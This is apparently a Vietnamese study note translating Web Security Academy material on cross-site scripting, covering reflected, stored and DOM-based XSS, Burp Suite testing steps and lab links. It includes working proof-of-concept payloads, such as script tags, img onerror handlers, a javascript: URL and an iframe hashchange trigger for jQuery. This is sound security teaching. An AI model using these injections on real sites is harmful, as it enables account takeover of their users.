# Cross-site scripting (XSS)

Trạng thái: Chưa bắt đầu
subject: Client-side

# XSS là gì?

---

Cross-site scripting (còn được gọi là XSS) là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào các tương tác mà người dùng thực hiện với một ứng dụng dễ bị tấn công. Nó cho phép kẻ tấn công vượt qua chính sách cùng nguồn gốc (same origin policy), vốn được thiết kế để tách biệt các website khác nhau.

Các lỗ hổng cross-site scripting thường cho phép kẻ tấn công giả mạo người dùng nạn nhân, thực hiện bất kỳ hành động nào mà người dùng có thể làm, và truy cập bất kỳ dữ liệu nào của người dùng. Nếu người dùng nạn nhân có quyền truy cập đặc quyền trong ứng dụng, kẻ tấn công thậm chí có thể chiếm quyền kiểm soát hoàn toàn toàn bộ chức năng và dữ liệu của ứng dụng.

---

# XSS hoạt động như nào?

---

Cross-site scripting hoạt động bằng cách lợi dụng một website có lỗ hổng để nó trả về mã JavaScript độc hại cho người dùng. Khi đoạn mã độc này được thực thi bên trong trình duyệt của nạn nhân, kẻ tấn công có thể chiếm toàn bộ quyền kiểm soát các tương tác của người dùng với ứng dụng.

![image.png](Cross-site%20scripting%20(XSS)/image.png)

---

# Tác động của XSS

---

Tác động thực tế của một cuộc tấn công XSS thường phụ thuộc vào bản chất của ứng dụng, chức năng và dữ liệu của nó, cũng như quyền hạn của người dùng bị xâm phạm. Ví dụ:

- Trong một ứng dụng dạng *brochureware*, nơi tất cả người dùng đều ẩn danh và toàn bộ thông tin đều công khai, tác động thường là tối thiểu.
- Trong một ứng dụng lưu trữ dữ liệu nhạy cảm, như giao dịch ngân hàng, email hoặc hồ sơ y tế, tác động thường sẽ nghiêm trọng.
- Nếu người dùng bị xâm phạm có quyền nâng cao trong ứng dụng, thì tác động nhìn chung sẽ là **nghiêm trọng**, cho phép kẻ tấn công chiếm toàn bộ quyền kiểm soát ứng dụng dễ bị tấn công và làm ảnh hưởng đến tất cả người dùng cùng dữ liệu của họ.

---

# PoC cho XSS

---

Bạn có thể xác nhận hầu hết các loại lỗ hổng XSS bằng cách chèn một payload khiến trình duyệt của chính bạn thực thi một đoạn JavaScript tùy ý. Lâu nay, việc sử dụng hàm `alert()` cho mục đích này đã trở thành thông lệ phổ biến vì nó ngắn gọn, vô hại và rất dễ nhận thấy khi được gọi thành công. Thực tế, bạn sẽ giải quyết phần lớn các lab XSS bằng cách gọi `alert()` trong trình duyệt của nạn nhân giả lập.

Tuy nhiên, có một trở ngại nhỏ khi bạn dùng Chrome. Từ phiên bản 92 (20/07/2021), các iframe cross-origin bị chặn không cho gọi `alert()`. Vì iframe cross-origin thường được sử dụng để xây dựng một số kiểu tấn công XSS nâng cao, đôi khi bạn sẽ cần dùng payload PoC thay thế. Trong trường hợp này, chúng tôi khuyến nghị sử dụng hàm `print()`. Nếu bạn quan tâm đến việc tìm hiểu thêm về thay đổi này và lý do chúng tôi ưa thích `print()`, hãy xem bài blog của chúng tôi về chủ đề này.

Vì trong các lab, nạn nhân giả lập sử dụng Chrome, chúng tôi đã chỉnh sửa những lab bị ảnh hưởng để cũng có thể giải bằng cách dùng `print()`. Điều này được chỉ rõ trong phần hướng dẫn ở những lab liên quan.

---

# Tìm và kiểm thử XSS

---

Phần lớn các lỗ hổng XSS có thể được phát hiện nhanh chóng và đáng tin cậy bằng cách sử dụng **trình quét lỗ hổng web của Burp Suite**.

Việc kiểm thử thủ công đối với **reflected XSS** và **stored XSS** thường bao gồm các bước:

- Gửi một số đầu vào đơn giản, duy nhất (ví dụ: một chuỗi chữ và số ngắn) vào mọi điểm nhập liệu trong ứng dụng.
- Xác định mọi vị trí mà dữ liệu đã nhập được phản hồi trong các phản hồi HTTP.
- Kiểm thử từng vị trí riêng lẻ để xem liệu dữ liệu được tạo thủ công có thể được dùng để thực thi JavaScript tùy ý hay không.

Bằng cách này, bạn có thể xác định **ngữ cảnh (context)** mà XSS xảy ra và chọn payload phù hợp để khai thác nó.

Việc kiểm thử thủ công **DOM-based XSS** phát sinh từ tham số URL cũng tương tự:

- Đặt một chuỗi dữ liệu đơn giản, duy nhất vào tham số.
- Sử dụng công cụ dành cho nhà phát triển (developer tools) của trình duyệt để tìm chuỗi đó trong DOM.
- Kiểm thử từng vị trí để xác định xem nó có thể khai thác được không.

Tuy nhiên, các loại DOM XSS khác thì khó phát hiện hơn. Để tìm các lỗ hổng DOM dựa trên:

- **nguồn không phải URL** (như `document.cookie`), hoặc
- **sink không phải HTML** (như `setTimeout`),

thì không có cách nào khác ngoài việc **xem xét mã JavaScript trực tiếp**, điều này có thể tốn rất nhiều thời gian.

Trình quét lỗ hổng web của Burp Suite kết hợp **phân tích tĩnh (static)** và **phân tích động (dynamic)** đối với JavaScript để tự động phát hiện các lỗ hổng DOM-based một cách đáng tin cậy.

---

# **Reflected XSS**

---

## Khái niệm

---

Reflected cross-site scripting (hay XSS phản chiếu) xuất hiện khi một ứng dụng nhận dữ liệu trong một HTTP request và chèn dữ liệu đó trực tiếp vào response ngay lập tức theo cách không an toàn.

Ví dụ, giả sử một website có chức năng tìm kiếm, nhận từ khóa do người dùng nhập qua tham số URL:

```
https://insecure-website.com/search?term=gift
```

Ứng dụng sẽ phản hồi bằng cách hiển thị lại từ khóa tìm kiếm trong trang kết quả:

```html
<p>You searched for: gift</p>
```

Nếu ứng dụng không xử lý thêm dữ liệu này, kẻ tấn công có thể tạo một URL tấn công như sau:

```
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>
```

Khi đó, response trả về sẽ trở thành:

```html
<p>You searched for: <script>/* Bad stuff here... */</script></p>
```

Nếu một người dùng khác truy cập URL do kẻ tấn công cung cấp, đoạn script chèn vào sẽ được thực thi trong trình duyệt của nạn nhân, trong **ngữ cảnh phiên làm việc (session context)** của họ với ứng dụng.

[Lab: Reflected XSS into HTML context with nothing encoded | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)

---

## Tác động

---

Nếu kẻ tấn công có thể kiểm soát một đoạn script được thực thi trong trình duyệt của nạn nhân, thì chúng thường có khả năng chiếm quyền kiểm soát hoàn toàn tài khoản của người dùng đó. Cụ thể, kẻ tấn công có thể:

- Thực hiện bất kỳ hành động nào trong ứng dụng mà người dùng có thể thực hiện.
- Xem bất kỳ thông tin nào mà người dùng có quyền xem.
- Sửa đổi bất kỳ thông tin nào mà người dùng có quyền chỉnh sửa.
- Khởi tạo tương tác với những người dùng khác của ứng dụng, bao gồm cả các cuộc tấn công độc hại, và khiến chúng trông như xuất phát từ người dùng nạn nhân ban đầu.

Có nhiều cách để kẻ tấn công lừa nạn nhân gửi một request do chúng kiểm soát nhằm triển khai tấn công reflected XSS, chẳng hạn như:

- Đặt liên kết độc hại trên một website do kẻ tấn công quản lý.
- Đặt liên kết trên một website khác cho phép người dùng tự tạo nội dung.
- Gửi liên kết qua email, tweet hoặc tin nhắn.

Cuộc tấn công có thể nhắm trực tiếp vào một người dùng cụ thể, hoặc thực hiện ngẫu nhiên với bất kỳ người dùng nào của ứng dụng.

Vì cần một **cơ chế truyền tải bên ngoài** để thực hiện, tác động của **reflected XSS** nhìn chung ít nghiêm trọng hơn so với **stored XSS**, nơi mà tấn công có thể tự tồn tại và thực thi hoàn toàn bên trong ứng dụng dễ bị tấn công.

---

## Ngữ cảnh

---

Có rất nhiều biến thể khác nhau của reflected cross-site scripting. **Vị trí mà dữ liệu được phản chiếu (reflected) trong response của ứng dụng** sẽ quyết định loại payload cần sử dụng để khai thác, đồng thời cũng có thể ảnh hưởng đến mức độ tác động của lỗ hổng.

Ngoài ra, nếu ứng dụng thực hiện bất kỳ quá trình kiểm tra hợp lệ (validation) hoặc xử lý dữ liệu nào trước khi phản chiếu lại, thì điều này cũng sẽ ảnh hưởng đến loại payload XSS cần được sử dụng.

---

## Tìm và kiểm thử

---

Phần lớn các lỗ hổng reflected cross-site scripting có thể được phát hiện nhanh chóng và đáng tin cậy bằng cách sử dụng **trình quét lỗ hổng web của Burp Suite**.

Việc kiểm thử thủ công lỗ hổng reflected XSS bao gồm các bước sau:

- **Kiểm thử mọi điểm nhập liệu:** Kiểm thử riêng biệt từng điểm nhập liệu cho dữ liệu trong HTTP request của ứng dụng. Điều này bao gồm các tham số hoặc dữ liệu khác trong query string của URL và message body, cũng như đường dẫn file trong URL. Nó cũng bao gồm cả các HTTP header, mặc dù hành vi giống XSS chỉ có thể được kích hoạt thông qua một số header nhất định thường sẽ không khai thác được trong thực tế.
- **Gửi giá trị chữ và số ngẫu nhiên:** Với mỗi điểm nhập liệu, gửi một giá trị ngẫu nhiên duy nhất và xác định xem giá trị đó có được phản chiếu trong response hay không. Giá trị nên được thiết kế để vượt qua hầu hết các kiểm tra đầu vào, vì vậy nó cần đủ ngắn gọn và chỉ bao gồm ký tự chữ và số. Nhưng cũng phải đủ dài để khả năng trùng hợp ngẫu nhiên trong response là rất thấp. Thông thường, một chuỗi chữ và số ngẫu nhiên khoảng 8 ký tự là lý tưởng. Bạn có thể dùng Burp Intruder với payload kiểu số được sinh ngẫu nhiên ở dạng hex để tạo ra giá trị ngẫu nhiên phù hợp. Đồng thời có thể sử dụng thiết lập grep payload của Burp Intruder để tự động đánh dấu các response chứa giá trị đã gửi.
- **Xác định ngữ cảnh phản chiếu:** Với mỗi vị trí trong response nơi giá trị ngẫu nhiên được phản chiếu, hãy xác định ngữ cảnh của nó. Nó có thể nằm trong văn bản giữa các thẻ HTML, trong thuộc tính của thẻ (có thể được đặt trong dấu nháy), trong một chuỗi JavaScript, v.v.
- **Kiểm thử payload thử nghiệm:** Dựa trên ngữ cảnh phản chiếu, kiểm thử một payload XSS ban đầu có thể kích hoạt thực thi JavaScript nếu nó được phản chiếu nguyên vẹn trong response. Cách dễ nhất để kiểm thử payload là gửi request sang Burp Repeater, chỉnh sửa request để chèn payload thử nghiệm, gửi request và xem xét response để xác định payload có hoạt động hay không. Một cách làm hiệu quả là giữ nguyên giá trị ngẫu nhiên gốc trong request và chèn payload XSS trước hoặc sau nó. Sau đó đặt giá trị ngẫu nhiên làm từ khóa tìm kiếm trong giao diện response của Burp Repeater. Burp sẽ đánh dấu mọi vị trí xuất hiện, cho phép bạn nhanh chóng xác định chỗ phản chiếu.
- **Kiểm thử payload thay thế:** Nếu payload thử nghiệm bị ứng dụng sửa đổi hoặc chặn hoàn toàn, bạn sẽ cần thử các payload và kỹ thuật thay thế có thể mang lại một cuộc tấn công XSS thành công, dựa trên ngữ cảnh phản chiếu và loại kiểm tra đầu vào đang được áp dụng.
- **Kiểm thử tấn công trong trình duyệt:** Cuối cùng, nếu bạn tìm được payload hoạt động trong Burp Repeater, hãy chuyển sang kiểm thử trong một trình duyệt thực (bằng cách dán URL vào thanh địa chỉ hoặc chỉnh sửa request trong Burp Proxy ở chế độ intercept) và xem liệu JavaScript được chèn có thực sự thực thi hay không. Thông thường, cách tốt nhất là chạy một đoạn JavaScript đơn giản như `alert(document.domain)` để hiện ra một popup trong trình duyệt nếu tấn công thành công.

---

## FAQs

---

**Sự khác biệt giữa reflected XSS và stored XSS là gì?**

Reflected XSS xảy ra khi một ứng dụng nhận dữ liệu từ HTTP request và nhúng dữ liệu đó trực tiếp vào response ngay lập tức theo cách không an toàn. Với stored XSS, ứng dụng sẽ lưu trữ dữ liệu đầu vào và nhúng nó vào một response về sau theo cách không an toàn.

**Sự khác biệt giữa reflected XSS và self-XSS là gì?**

Self-XSS có hành vi ứng dụng tương tự như reflected XSS thông thường, tuy nhiên nó không thể được kích hoạt theo cách bình thường bằng một URL được tạo thủ công hoặc một request cross-domain. Thay vào đó, lỗ hổng chỉ bị khai thác nếu chính nạn nhân tự mình nhập payload XSS vào trình duyệt. Việc triển khai một cuộc tấn công self-XSS thường liên quan đến **kỹ nghệ xã hội (social engineering)** để dụ nạn nhân dán đoạn dữ liệu do kẻ tấn công cung cấp vào trình duyệt của họ. Do đó, self-XSS thường được coi là một vấn đề yếu, có mức độ ảnh hưởng thấp.

---

# Stored XSS

---

## Khái niệm

---

Stored cross-site scripting (còn được gọi là **second-order XSS** hoặc **persistent XSS**) xảy ra khi một ứng dụng nhận dữ liệu từ một nguồn không đáng tin cậy và sau đó nhúng dữ liệu đó vào các HTTP response về sau theo cách không an toàn.

Ví dụ, giả sử một website cho phép người dùng gửi bình luận trên các bài blog, và những bình luận này sẽ được hiển thị cho người dùng khác. Người dùng gửi bình luận bằng một HTTP request như sau:

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```

Sau khi bình luận này được gửi, bất kỳ người dùng nào truy cập bài blog sẽ nhận được response chứa nội dung:

```html
<p>This post was extremely helpful.</p>
```

Nếu ứng dụng không xử lý dữ liệu này, kẻ tấn công có thể gửi một bình luận độc hại như sau:

```html
<script>/* Bad stuff here... */</script>
```

Trong request của kẻ tấn công, bình luận này sẽ được URL-encode thành:

```
comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
```

Khi đó, bất kỳ người dùng nào truy cập bài blog sẽ nhận được response:

```html
<p><script>/* Bad stuff here... */</script></p>
```

Và đoạn script do kẻ tấn công chèn vào sẽ được thực thi trong trình duyệt của nạn nhân, trong **ngữ cảnh phiên làm việc (session context)** của họ với ứng dụng.

[Lab: Stored XSS into HTML context with nothing encoded | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)

---

## Tác động

---

Nếu kẻ tấn công có thể kiểm soát một đoạn script được thực thi trong trình duyệt của nạn nhân, thì chúng thường có khả năng chiếm quyền kiểm soát hoàn toàn tài khoản của người dùng đó. Kẻ tấn công có thể thực hiện bất kỳ hành động nào liên quan đến tác động của lỗ hổng reflected XSS.

Về khả năng khai thác, sự khác biệt chính giữa reflected XSS và stored XSS là: **stored XSS cho phép tấn công tồn tại ngay bên trong ứng dụng**. Kẻ tấn công không cần tìm cách bên ngoài để dụ người dùng gửi request chứa payload khai thác. Thay vào đó, chúng chỉ cần chèn exploit trực tiếp vào ứng dụng và chờ người dùng truy cập để kích hoạt.

Tính chất “tự tồn tại” (self-contained) của stored XSS đặc biệt quan trọng trong những tình huống mà lỗ hổng XSS chỉ ảnh hưởng đến người dùng đang đăng nhập. Với reflected XSS, cuộc tấn công phải được **thời gian hóa chính xác**: nếu người dùng truy cập URL độc hại khi chưa đăng nhập thì họ sẽ không bị ảnh hưởng. Ngược lại, với stored XSS, người dùng chắc chắn sẽ đang đăng nhập vào lúc họ tương tác với payload độc hại.

---

## Ngữ cảnh

---

Có rất nhiều biến thể khác nhau của stored cross-site scripting. **Vị trí mà dữ liệu được lưu trữ và sau đó hiển thị trong response của ứng dụng** sẽ quyết định loại payload cần được sử dụng để khai thác, đồng thời cũng có thể ảnh hưởng đến mức độ tác động của lỗ hổng.

Ngoài ra, nếu ứng dụng thực hiện bất kỳ quá trình **kiểm tra hợp lệ (validation)** hoặc xử lý dữ liệu nào trước khi lưu trữ, hoặc tại thời điểm dữ liệu được chèn vào response, thì điều này cũng sẽ ảnh hưởng đến loại payload XSS cần được sử dụng.

---

## Tìm và kiểm thử

---

Nhiều lỗ hổng stored XSS có thể được phát hiện bằng **trình quét lỗ hổng web của Burp Suite**.

Kiểm thử thủ công đối với stored XSS có thể thách thức. Bạn cần kiểm thử tất cả các “điểm vào” (entry point) liên quan mà qua đó dữ liệu do kẻ tấn công kiểm soát có thể đi vào quá trình xử lý của ứng dụng, và tất cả các “điểm ra” (exit point) nơi dữ liệu đó có thể xuất hiện trong các phản hồi của ứng dụng.

**Các điểm vào** vào quá trình xử lý của ứng dụng bao gồm:

- Tham số hoặc dữ liệu khác trong query string của URL và phần thân thông điệp (message body).
- Đường dẫn tệp trong URL.
- Các HTTP request header có thể không khai thác được trong bối cảnh reflected XSS.
- Bất kỳ kênh out-of-band nào qua đó kẻ tấn công có thể đưa dữ liệu vào ứng dụng. Các kênh này phụ thuộc hoàn toàn vào chức năng của ứng dụng: một ứng dụng webmail sẽ xử lý dữ liệu nhận qua email; một ứng dụng hiển thị Twitter feed có thể xử lý dữ liệu trong tweet của bên thứ ba; còn một bộ tổng hợp tin tức sẽ đưa vào dữ liệu có nguồn gốc từ các website khác.

**Các điểm ra** cho tấn công stored XSS là mọi phản hồi HTTP có thể được trả về cho bất kỳ loại người dùng nào của ứng dụng trong bất kỳ tình huống nào.

Bước đầu tiên khi kiểm thử stored XSS là xác định **mối liên kết giữa các điểm vào và điểm ra**, tức là nơi dữ liệu gửi vào một điểm vào sẽ được phát ra từ một điểm ra. Việc này khó vì:

- Dữ liệu gửi vào **bất kỳ** điểm vào nào về nguyên tắc cũng có thể được phát ra từ **bất kỳ** điểm ra nào. Ví dụ, tên hiển thị do người dùng cung cấp có thể xuất hiện trong một nhật ký kiểm toán khó tìm, chỉ hiển thị cho một số người dùng.
- Dữ liệu hiện do ứng dụng lưu trữ thường có thể bị ghi đè bởi các hành động khác trong ứng dụng. Ví dụ, chức năng tìm kiếm có thể hiển thị danh sách tìm kiếm gần đây, nhưng chúng nhanh chóng bị thay thế khi người dùng thực hiện các tìm kiếm mới.

Để nhận diện đầy đủ các liên kết giữa điểm vào và điểm ra, về lý thuyết cần kiểm thử từng hoán vị riêng: gửi một giá trị cụ thể vào điểm vào, điều hướng trực tiếp đến điểm ra và xác định xem giá trị có xuất hiện ở đó không. Tuy nhiên, cách tiếp cận này không thực tế với các ứng dụng có nhiều hơn vài trang.

Thay vào đó, một cách tiếp cận thực tế hơn là làm việc **có hệ thống qua các điểm nhập dữ liệu**, gửi một giá trị cụ thể vào từng điểm và **giám sát các phản hồi** của ứng dụng để phát hiện trường hợp giá trị đã gửi xuất hiện. Cần chú ý đặc biệt đến các chức năng phù hợp của ứng dụng, như phần bình luận bài blog. Khi thấy giá trị đã gửi xuất hiện trong một phản hồi, bạn cần xác định xem dữ liệu thực sự đang được **lưu trữ qua nhiều request khác nhau**, hay chỉ đơn giản là **bị phản chiếu** trong phản hồi ngay lập tức.

Khi bạn đã xác định được các liên kết giữa điểm vào và điểm ra trong quá trình xử lý của ứng dụng, **mỗi liên kết** cần được kiểm thử cụ thể để phát hiện liệu có tồn tại lỗ hổng stored XSS hay không. Điều này bao gồm việc xác định **ngữ cảnh** trong phản hồi nơi dữ liệu được lưu trữ xuất hiện và thử nghiệm các **payload XSS ứng viên** phù hợp với ngữ cảnh đó. Tại thời điểm này, **phương pháp kiểm thử** về cơ bản giống với cách tìm lỗ hổng **reflected XSS**.

---

# **DOM-based XSS**

---

## Khái niệm

---

Lỗ hổng DOM-based XSS thường xuất hiện khi JavaScript lấy dữ liệu từ một nguồn có thể bị kẻ tấn công kiểm soát (chẳng hạn như URL) và truyền dữ liệu đó đến một **sink** hỗ trợ thực thi mã động, như `eval()` hoặc `innerHTML`. Điều này cho phép kẻ tấn công thực thi JavaScript độc hại, từ đó thường dẫn đến việc chiếm quyền tài khoản của người dùng khác.

Để triển khai một cuộc tấn công DOM-based XSS, bạn cần chèn dữ liệu vào một **source** sao cho dữ liệu này được truyền tới một **sink** và gây ra việc thực thi JavaScript tùy ý.

Nguồn phổ biến nhất của DOM XSS là **URL**, thường được truy cập thông qua đối tượng `window.location`. Kẻ tấn công có thể tạo một liên kết để dụ nạn nhân truy cập vào một trang dễ bị tấn công, trong đó payload được chèn vào query string hoặc fragment của URL. Trong một số trường hợp, chẳng hạn khi nhắm đến trang 404 hoặc website chạy PHP, payload cũng có thể được đặt trong **đường dẫn (path)**.

Để có giải thích chi tiết về **luồng dữ liệu ô nhiễm (taint flow)** giữa nguồn (source) và điểm nhận (sink), hãy tham khảo phần **DOM-based vulnerabilities**.

---

## Kiểm thử

---

Phần lớn các lỗ hổng DOM XSS có thể được phát hiện nhanh chóng và đáng tin cậy bằng **trình quét lỗ hổng web của Burp Suite**.

Để kiểm thử thủ công DOM-based XSS, bạn thường cần sử dụng một trình duyệt có công cụ dành cho nhà phát triển (developer tools), chẳng hạn như Chrome. Bạn cần lần lượt kiểm thử từng **source** có sẵn và kiểm thử riêng từng cái một.

---

### 1. HTML sinks

---

Để kiểm thử DOM XSS trong một HTML sink, hãy đặt một chuỗi chữ–số ngẫu nhiên vào **source** (chẳng hạn như `location.search`), sau đó dùng công cụ dành cho nhà phát triển để kiểm tra HTML và tìm nơi chuỗi của bạn xuất hiện. Lưu ý rằng tùy chọn “View source” của trình duyệt sẽ không hoạt động cho việc kiểm thử DOM XSS vì nó không tính đến các thay đổi trong HTML do JavaScript thực hiện. Trong công cụ dành cho nhà phát triển của Chrome, bạn có thể dùng Control+F (hoặc Command+F trên macOS) để tìm chuỗi của bạn trong DOM.

Với mỗi vị trí chuỗi của bạn xuất hiện trong DOM, bạn cần xác định **ngữ cảnh**. Dựa trên ngữ cảnh này, bạn cần tinh chỉnh đầu vào để xem nó được xử lý như thế nào. Ví dụ, nếu chuỗi của bạn xuất hiện trong một thuộc tính đặt trong dấu nháy kép, hãy thử chèn dấu nháy kép vào chuỗi của bạn để xem liệu bạn có thể thoát ra khỏi thuộc tính đó hay không.

Lưu ý rằng các trình duyệt có hành vi khác nhau liên quan đến **URL-encoding**: Chrome, Firefox và Safari sẽ URL-encode `location.search` và `location.hash`, trong khi IE11 và Microsoft Edge (tiền Chromium) sẽ **không** URL-encode các nguồn này. Nếu dữ liệu của bạn bị URL-encode trước khi được xử lý, thì một cuộc tấn công XSS khó có thể hoạt động.

---

### 2. JavaScript execution sink

---

Kiểm thử các JavaScript execution sink cho DOM-based XSS khó hơn một chút. Với các sink này, đầu vào của bạn không nhất thiết sẽ xuất hiện trực tiếp trong DOM, vì vậy bạn không thể chỉ tìm kiếm chuỗi đã chèn. Thay vào đó, bạn cần sử dụng **JavaScript debugger** để xác định liệu và cách dữ liệu đầu vào của bạn được truyền tới sink.

Với mỗi **source** tiềm năng (chẳng hạn như `location`), trước hết bạn cần tìm trong mã JavaScript của trang những vị trí mà source đó được tham chiếu. Trong công cụ dành cho nhà phát triển của Chrome, bạn có thể dùng **Control+Shift+F** (hoặc **Command+Alt+F** trên macOS) để tìm kiếm trong toàn bộ mã JavaScript của trang.

Khi bạn đã tìm thấy nơi source được đọc, bạn có thể sử dụng **JavaScript debugger** để đặt breakpoint và theo dõi cách giá trị của source được xử lý. Bạn có thể thấy rằng source được gán cho các biến khác. Nếu vậy, bạn cần dùng chức năng tìm kiếm một lần nữa để theo dõi các biến này và xem chúng có được truyền đến sink hay không.

Khi bạn phát hiện một sink nhận dữ liệu có nguồn gốc từ source, bạn có thể dùng debugger để kiểm tra giá trị bằng cách di chuột qua biến để xem nội dung của nó trước khi được truyền vào sink. Sau đó, giống như với HTML sink, bạn cần **tinh chỉnh đầu vào** để xem liệu có thể thực hiện thành công một cuộc tấn công XSS hay không.

---

### 3. DOM Invader

---

Việc xác định và khai thác DOM XSS trong môi trường thực tế có thể là một quá trình tốn công, thường yêu cầu bạn phải thủ công rà soát qua các đoạn JavaScript phức tạp, đã được nén (minified). Tuy nhiên, nếu bạn sử dụng **trình duyệt của Burp**, bạn có thể tận dụng tiện ích mở rộng tích hợp sẵn là **DOM Invader**, công cụ này sẽ tự động xử lý phần lớn công việc khó khăn cho bạn.

---

## Khai thác

---

Về nguyên tắc, một website sẽ dễ bị tấn công DOM-based cross-site scripting nếu tồn tại một đường thực thi mà dữ liệu có thể truyền từ **source** đến **sink**. Trên thực tế, các source và sink khác nhau có những đặc tính và hành vi khác nhau, ảnh hưởng đến khả năng khai thác và quyết định kỹ thuật nào cần sử dụng. Ngoài ra, script của website có thể thực hiện **kiểm tra hợp lệ (validation)** hoặc xử lý dữ liệu khác, những điều này cũng cần được tính đến khi cố gắng khai thác lỗ hổng.

Có nhiều loại **sink** liên quan đến các lỗ hổng DOM-based. Vui lòng tham khảo danh sách dưới đây để biết chi tiết.

**Sink `document.write`** hoạt động với các phần tử `<script>`, do đó bạn có thể sử dụng một payload đơn giản như sau:

```jsx
document.write('... <script>alert(document.domain)</script> ...');
```

[Lab: DOM XSS in document.write sink using source location.search | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)

Tuy nhiên, hãy lưu ý rằng trong một số tình huống, nội dung được ghi vào `document.write` có thể kèm theo **ngữ cảnh bao quanh** mà bạn cần tính đến trong exploit. Ví dụ, bạn có thể cần phải **đóng một số thẻ HTML đang mở** trước khi chèn payload JavaScript của mình.

[Lab: DOM XSS in document.write sink using source location.search inside a select element | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)

**Sink `innerHTML`** không chấp nhận phần tử `<script>` trên bất kỳ trình duyệt hiện đại nào, và sự kiện `onload` trong SVG cũng sẽ không được kích hoạt. Điều này có nghĩa là bạn cần sử dụng các phần tử thay thế như **`<img>`** hoặc **`<iframe>`**.

Các **event handler** như `onload` và `onerror` có thể được sử dụng kết hợp với các phần tử này. Ví dụ:

```jsx
element.innerHTML = '... <img src=1 onerror=alert(document.domain)> ...'
```

[Lab: DOM XSS in innerHTML sink using source location.search | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)

---

## **Third-party dependencies**

---

Các ứng dụng web hiện đại thường được xây dựng dựa trên nhiều **thư viện và framework của bên thứ ba**, cung cấp thêm các chức năng và khả năng cho lập trình viên. Điều quan trọng cần ghi nhớ là một số thư viện và framework này cũng có thể trở thành **nguồn (source)** hoặc **sink** tiềm năng cho các lỗ hổng DOM XSS.

---

### jQuery

---

Nếu một thư viện JavaScript như **jQuery** được sử dụng, hãy chú ý đến các **sink** có thể thay đổi các phần tử DOM trên trang. Ví dụ, hàm `attr()` của jQuery có thể thay đổi thuộc tính của các phần tử DOM. Nếu dữ liệu được đọc từ một nguồn do người dùng kiểm soát (chẳng hạn như URL) rồi được truyền vào hàm `attr()`, thì kẻ tấn công có thể thao túng giá trị này để gây ra XSS.

Ví dụ, đoạn JavaScript sau thay đổi thuộc tính `href` của thẻ `<a>` bằng dữ liệu từ URL:

```jsx
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

Bạn có thể khai thác điều này bằng cách chỉnh sửa URL để `location.search` chứa một URL JavaScript độc hại. Khi JavaScript của trang áp dụng URL này vào thuộc tính `href` của liên kết, việc nhấp vào liên kết sẽ kích hoạt đoạn mã độc hại:

```
?returnUrl=javascript:alert(document.domain)
```

[Lab: DOM XSS in jQuery anchor href attribute sink using location.search source | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)

Một sink khác cần chú ý là hàm **`$()` selector** của jQuery, có thể bị lợi dụng để chèn các đối tượng độc hại vào DOM.

jQuery từng cực kỳ phổ biến, và một lỗ hổng DOM XSS kinh điển thường xuất hiện khi website sử dụng selector này kết hợp với nguồn `location.hash` để xử lý hiệu ứng animation hoặc tự động cuộn đến một phần tử cụ thể trên trang. Hành vi này thường được triển khai qua **hashchange event handler** dễ bị tấn công, ví dụ:

```jsx
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```

Vì `hash` có thể bị người dùng kiểm soát, kẻ tấn công có thể lợi dụng nó để chèn vector XSS vào sink `$()`. Các phiên bản jQuery gần đây đã vá lỗ hổng này bằng cách ngăn không cho chèn HTML vào selector nếu đầu vào bắt đầu bằng ký tự `#`. Tuy nhiên, bạn vẫn có thể gặp phải các đoạn code dễ bị tấn công trong thực tế.

Để thực sự khai thác lỗ hổng kinh điển này, bạn cần tìm cách kích hoạt sự kiện `hashchange` mà không cần người dùng tương tác. Một trong những cách đơn giản nhất là triển khai exploit qua một **iframe**:

```html
<iframe src="https://vulnerable-website.com#"
        onload="this.src+='<img src=1 onerror=alert(1)>'">
</iframe>
```

Trong ví dụ này, thuộc tính `src` trỏ đến trang dễ bị tấn công với một giá trị hash rỗng. Khi iframe được load, một vector XSS được nối thêm vào hash, khiến sự kiện `hashchange` được kích hoạt.

> **Lưu ý**
Ngay cả các phiên bản jQuery mới hơn vẫn có thể bị khai thác thông qua **sink `$()` selector**, miễn là bạn có toàn quyền kiểm soát đầu vào của nó từ một **source không yêu cầu tiền tố `#`**.
> 

[Lab: DOM XSS in jQuery selector sink using a hashchange event | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)

---

### AngularJs

---

Nếu một framework như **AngularJS** được sử dụng, có thể thực thi JavaScript **mà không cần dấu ngoặc nhọn `< >` hoặc sự kiện (event)**. Khi một website sử dụng thuộc tính **`ng-app`** trên một phần tử HTML, phần tử đó sẽ được AngularJS xử lý. Trong trường hợp này, AngularJS có thể thực thi JavaScript nằm trong **cặp dấu ngoặc nhọn kép `{{ ... }}`**, và chúng có thể xuất hiện trực tiếp trong HTML hoặc bên trong các thuộc tính.

[Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)

---

## Reflected + Stored

---

Một số lỗ hổng DOM-based thuần túy tồn tại độc lập trong một trang. Ví dụ, nếu một script đọc dữ liệu từ URL rồi ghi trực tiếp vào một **sink nguy hiểm**, thì lỗ hổng này hoàn toàn nằm ở phía client.

Tuy nhiên, **nguồn dữ liệu (source)** không chỉ giới hạn ở những gì được trình duyệt cung cấp trực tiếp – chúng cũng có thể bắt nguồn từ **chính website**. Ví dụ, nhiều website phản chiếu tham số URL vào HTML response từ server. Điều này thường liên quan đến XSS thông thường, nhưng cũng có thể dẫn đến lỗ hổng **reflected DOM XSS**.

